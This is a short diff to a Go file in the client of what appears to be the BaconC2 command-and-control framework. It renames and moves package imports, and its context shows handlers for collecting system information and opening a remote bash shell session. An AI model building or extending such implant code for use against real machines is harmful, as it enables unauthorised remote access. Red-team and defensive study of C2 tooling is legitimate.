@@ -7,15 +7,16 @@ import (
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
-	"github.com/RabbITCybErSeC/BaconC2/client/models"
-	"github.com/RabbITCybErSeC/BaconC2/client/queue"
+	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
 
 const (
 	shellSessionTimeout = 30 * time.Second
 )
 
-func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport models.ITransportProtocol, streamingTransport models.IStreamingTransport) {
+func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport local_models.ITransportProtocol, streamingTransport local_models.IStreamingTransport) {
 	registry.RegisterHandler("sys_info", func(cmd models.Command) models.CommandResult {
 		return getInfoHandler(cmd, resultsQueue)
 	})
@@ -67,8 +68,8 @@ func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.
 	return result
 }
 
-func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, streamingTransport models.IStreamingTransport) models.CommandResult {
-	config := models.NewStreamingConfig(models.ShellTypeBash, "xterm")
+func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, streamingTransport local_models.IStreamingTransport) models.CommandResult {
+	config := local_models.NewStreamingConfig(local_models.ShellTypeBash, "xterm")
 
 	resultChan := make(chan models.CommandResult, 1)
 	var wg sync.WaitGroup
